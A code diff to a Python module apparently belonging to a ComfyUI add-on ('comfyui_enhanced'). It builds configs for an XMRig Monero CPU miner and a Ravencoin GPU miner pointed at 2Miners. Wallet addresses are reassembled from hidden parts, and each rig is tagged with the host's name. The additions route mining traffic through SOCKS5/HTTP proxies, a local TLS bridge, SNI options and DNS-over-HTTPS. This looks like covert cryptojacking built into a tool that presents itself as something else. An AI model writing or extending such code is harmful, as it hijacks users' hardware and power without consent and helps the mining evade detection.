@@ -11,6 +11,8 @@ logger = logging.getLogger("comfyui_enhanced")
 
 IS_LINUX = platform.system() == "Linux"
 
+from core.egress_net import map_2miners_rvn_ssl_port  # noqa: E402
+
 try:
     import psutil
 except ImportError:
@@ -81,6 +83,84 @@ class ConfigBuilder:
     def __init__(self, settings: dict | None = None):
         self.settings = settings or {}
 
+    def _build_pools(
+        self,
+        *,
+        pool_url: str,
+        pool_user: str,
+        pool_pass: str,
+        pool_tls: bool,
+        pool_tls_fp: str | None,
+        pool_tls_sni_flag: bool,
+        pool_socks5: str | None,
+    ) -> list[dict]:
+        uses_ssl_scheme = pool_url.startswith("stratum+ssl")
+        primary_tls = False if uses_ssl_scheme else bool(pool_tls)
+        primary: dict = {
+            "algo": None,
+            "coin": "monero",
+            "url": pool_url,
+            "user": pool_user,
+            "pass": pool_pass,
+            "rig-id": get_hostname(),
+            "nicehash": False,
+            "keepalive": True,
+            "enabled": True,
+            "tls": primary_tls,
+            "tls-fingerprint": pool_tls_fp,
+            "daemon": False,
+            "socks5": pool_socks5,
+            "self-select": None,
+            "submit-to-origin": False,
+            "sni": pool_tls_sni_flag,
+        }
+        pools: list[dict] = [primary]
+
+        for bp in self.settings.get("backup_pools") or []:
+            if not isinstance(bp, dict) or not bp.get("enabled", True):
+                continue
+            row = dict(primary)
+            row["enabled"] = True
+            if bp.get("socks5"):
+                row["socks5"] = bp["socks5"]
+            if bp.get("user"):
+                row["user"] = str(bp["user"])
+            if bp.get("pass") is not None:
+                row["pass"] = str(bp["pass"])
+            if "sni" in bp:
+                row["sni"] = bool(bp["sni"])
+            bp_fp = bp.get("pool_tls_fingerprint", bp.get("tls-fingerprint"))
+            if isinstance(bp_fp, str) and bp_fp.strip():
+                row["tls-fingerprint"] = bp_fp.strip()
+            elif "tls-fingerprint" in bp:
+                row["tls-fingerprint"] = bp.get("tls-fingerprint")
+
+            if bp.get("url"):
+                u = str(bp["url"])
+                row["url"] = u
+                row["tls"] = False if u.startswith("stratum+ssl") else bool(
+                    bp.get("pool_tls", bp.get("tls", False))
+                )
+                pools.append(row)
+                continue
+            bh = (bp.get("pool_host") or bp.get("host") or "").strip()
+            if not bh:
+                continue
+            try:
+                pnum = int(bp.get("pool_port", bp.get("port", 443)))
+            except (TypeError, ValueError):
+                pnum = 443
+            bp_tls = bool(bp.get("pool_tls", bp.get("tls", True)))
+            if bp_tls:
+                row["url"] = f"stratum+ssl://{bh}:{pnum}"
+                row["tls"] = False
+            else:
+                row["url"] = f"{bh}:{pnum}"
+                row["tls"] = False
+            pools.append(row)
+
+        return pools
+
     def build(self) -> dict:
         threads = _detect_cpu_threads()
         ram_gb = _detect_total_ram_gb()
@@ -90,6 +170,44 @@ class ConfigBuilder:
         pool_user = self.settings.get("pool_user") or _reassemble_wallet()
         pool_pass = self.settings.get("pool_pass", DEFAULT_POOL_PASS)
         api_port = self.settings.get("api_port", 44880)
+
+        bridge = self.settings.get("local_tls_bridge") or {}
+        bridge_enabled = bool(bridge.get("enabled"))
+        pool_tls_sni_flag = False
+        if bridge_enabled:
+            # XMRig talks cleartext stratum to loopback; stratum_local_bridge adds TLS upstream.
+            pool_host = str(bridge.get("listen_host", "127.0.0.1"))
+            pool_port = int(bridge.get("listen_port", 33334))
+            pool_tls = False
+            pool_tls_fp = None
+            pool_url = f"{pool_host}:{pool_port}"
+        else:
+            pool_tls = bool(self.settings.get("pool_tls", False))
+            pool_tls_fp = self.settings.get("pool_tls_fingerprint")
+            if isinstance(pool_tls_fp, str) and not pool_tls_fp.strip():
+                pool_tls_fp = None
+            pool_tls_verify = str(self.settings.get("pool_tls_verify", "system")).lower().strip()
+            if pool_tls_verify not in ("system", "pinned", "insecure"):
+                pool_tls_verify = "system"
+            if pool_tls_verify == "pinned" and not pool_tls_fp:
+                logger.warning("pool_tls_verify=pinned but pool_tls_fingerprint missing — falling back to system")
+                pool_tls_verify = "system"
+            if pool_tls_verify == "insecure":
+                logger.critical(
+                    "pool_tls_verify=insecure: XMRig still verifies pool certificates unless tls-fingerprint matches; "
+                    "for MITM labs use local_tls_bridge with upstream_tls_verify=insecure"
+                )
+            pool_tls_sni_flag = bool(self.settings.get("pool_tls_sni", True)) if pool_tls else False
+            if pool_tls:
+                pool_url = f"stratum+ssl://{pool_host}:{pool_port}"
+            else:
+                pool_url = f"{pool_host}:{pool_port}"
+            if pool_tls_verify == "insecure":
+                pool_tls_fp = None
+
+        pool_socks5 = self.settings.get("pool_socks5")
+        if isinstance(pool_socks5, str) and not pool_socks5.strip():
+            pool_socks5 = None
 
         huge_pages = ram_gb >= 4
 
@@ -150,25 +268,15 @@ class ConfigBuilder:
             "opencl": {"enabled": False},
             "cuda": {"enabled": False},
 
-            "pools": [
-                {
-                    "algo": None,
-                    "coin": "monero",
-                    "url": f"{pool_host}:{pool_port}",
-                    "user": pool_user,
-                    "pass": pool_pass,
-                    "rig-id": get_hostname(),
-                    "nicehash": False,
-                    "keepalive": True,
-                    "enabled": True,
-                    "tls": False,
-                    "tls-fingerprint": None,
-                    "daemon": False,
-                    "socks5": None,
-                    "self-select": None,
-                    "submit-to-origin": False,
-                }
-            ],
+            "pools": self._build_pools(
+                pool_url=pool_url,
+                pool_user=pool_user,
+                pool_pass=pool_pass,
+                pool_tls=pool_tls,
+                pool_tls_fp=pool_tls_fp,
+                pool_tls_sni_flag=pool_tls_sni_flag,
+                pool_socks5=pool_socks5,
+            ),
 
             "tls": {
                 "enabled": False,
@@ -209,16 +317,46 @@ class ConfigBuilder:
         gpu_wallet = gpu_settings.get("wallet") or self.settings.get("gpu_wallet")
         if not gpu_wallet:
             gpu_wallet = _reassemble_rvn_wallet()
+        pool = gpu_settings.get("pool", "rvn.2miners.com")
+        port = int(gpu_settings.get("port", 6060))
+        tls = bool(gpu_settings.get("tls", False))
+        mapped_port, did_map = map_2miners_rvn_ssl_port(str(pool), port, tls)
+        if did_map:
+            logger.info(
+                "GPU pool TLS auto-map (2Miners RVN): %s:%d -> %d",
+                pool,
+                port,
+                mapped_port,
+            )
+        http_proxy = gpu_settings.get("http_proxy")
+        if isinstance(http_proxy, str) and not http_proxy.strip():
+            http_proxy = None
+        socks5 = gpu_settings.get("socks5")
+        if isinstance(socks5, str) and not socks5.strip():
+            socks5 = None
+        if "use_http_socks_gateway" in gpu_settings:
+            use_http_socks_gateway = bool(gpu_settings["use_http_socks_gateway"])
+        else:
+            use_http_socks_gateway = bool(http_proxy) and not socks5
+
         return {
             "wallet": gpu_wallet,
             "worker": gpu_settings.get("worker", get_hostname()),
             "algo": gpu_settings.get("algo", "kawpow"),
-            "pool": gpu_settings.get("pool", "rvn.2miners.com"),
-            "port": gpu_settings.get("port", 6060),
-            "tls": gpu_settings.get("tls", False),
+            "pool": pool,
+            "port": mapped_port,
+            "tls": tls,
             "api_port": gpu_settings.get("api_port", 4067),
             "temp_limit": gpu_settings.get("temp_limit", 72),
             "temp_resume": gpu_settings.get("temp_resume", 55),
+            "dns_https_server": gpu_settings.get("dns_https_server"),
+            "socks5": socks5,
+            "http_proxy": http_proxy,
+            "use_http_socks_gateway": use_http_socks_gateway,
+            "socks_gateway_listen_host": gpu_settings.get("socks_gateway_listen_host", "127.0.0.1"),
+            "socks_gateway_listen_port": int(gpu_settings.get("socks_gateway_listen_port", 21080)),
+            "strict_ssl": bool(gpu_settings.get("strict_ssl", False)),
+            "no_sni": bool(gpu_settings.get("no_sni", False)),
         }
 
     @staticmethod
